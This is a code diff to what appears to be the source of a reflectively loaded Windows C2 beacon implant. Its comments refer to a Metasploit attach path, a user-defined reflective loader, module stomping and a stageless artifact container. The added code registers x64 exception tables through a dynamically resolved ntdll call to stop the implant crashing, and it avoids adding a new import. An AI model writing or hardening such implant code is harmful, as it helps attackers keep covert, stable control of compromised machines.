@@ -25,6 +25,54 @@ static void settings_init_once(HINSTANCE hinstDLL) {
 	}
 }
 
+/* x64 unwind registration (2026-10-19 interpreter crash fix): the
+ * reflective image's .pdata is invisible to ntdll unless registered via
+ * RtlAddFunctionTable. Every code path that unwinds - picoc's ProgramFail
+ * longjmp, SEH __except propagation from our VM sandbox, any hardware
+ * fault whose dispatch walks beacon frames - hit STATUS_BAD_STACK
+ * (0xC0000028, ExceptionAddress=0; dumps 10052/11140/5552) because
+ * RtlLookupFunctionEntry returned NULL for beacon addresses. OS-loaded
+ * PEs get this from the loader; reflective DLLs must do it themselves.
+ * Resolved dynamically (no new import), idempotent, never removed. */
+static void register_exception_tables(HINSTANCE hinstDLL) {
+	typedef BOOL (WINAPI *fnRAFT)(PRUNTIME_FUNCTION, DWORD, ULONG64);
+	fnRAFT fn;
+	unsigned char * img;
+	IMAGE_DOS_HEADER * dos;
+	IMAGE_NT_HEADERS * nt;
+	IMAGE_DATA_DIRECTORY * ex;
+	HMODULE ntdll;
+
+	if (hinstDLL == NULL)
+		return;
+	img = (unsigned char *)hinstDLL;
+	{
+		MEMORY_BASIC_INFORMATION mbi;
+		if (!VirtualQuery(img, &mbi, sizeof(mbi)) || mbi.State != MEM_COMMIT)
+			return;
+	}
+	dos = (IMAGE_DOS_HEADER *)img;
+	if (dos->e_magic != 0x5A4D || dos->e_lfanew <= 0 || dos->e_lfanew > 0x1000)
+		return;
+	nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
+	if (nt->Signature != 0x00004550)
+		return;
+	if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+		return; /* x86 has no .pdata walk */
+	ex = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+	if (ex->VirtualAddress == 0 || ex->Size < sizeof(RUNTIME_FUNCTION))
+		return;
+	ntdll = GetModuleHandleA("ntdll.dll");
+	if (ntdll == NULL)
+		return;
+	fn = (fnRAFT)GetProcAddress(ntdll, "RtlAddFunctionTable");
+	if (fn == NULL)
+		return;
+	fn((PRUNTIME_FUNCTION)(img + ex->VirtualAddress),
+	   ex->Size / sizeof(RUNTIME_FUNCTION),
+	   (ULONG64)(UINT_PTR)img);
+}
+
 /* P4: release the artifact container's decode buffer. Our UDRL passes a
  * handoff struct (magic 'BWCF' + allocation base) as the reason-4
  * parameter: by the time DllMain runs we execute from the stomped image
@@ -80,6 +128,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 		case DLL_PROCESS_ATTACH:
 			/* 只解析配置；beacon 循环不在 ATTACH 阶段启动 —— 见 DLL_METASPLOIT_ATTACH。 */
 			settings_init_once(hinstDLL);
+			register_exception_tables(hinstDLL);
 			break;
 		case DLL_METASPLOIT_ATTACH:
 			/* 契约：本分支不得返回到调用方。stageless 容器（artifact64big.exe）的 stub
@@ -91,6 +140,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			   beacon() 只经 safe_exit 终止）；此处再留最后一道防御——若 beacon() 因任何
 			   缺陷返回，显式结束线程，杜绝跌落。 */
 			settings_init_once(hinstDLL);
+			register_exception_tables(hinstDLL);
 
 			/* P4: drop the container's decode buffer (full PE copy of us)
 			   before the beacon loop starts - see container_release() */
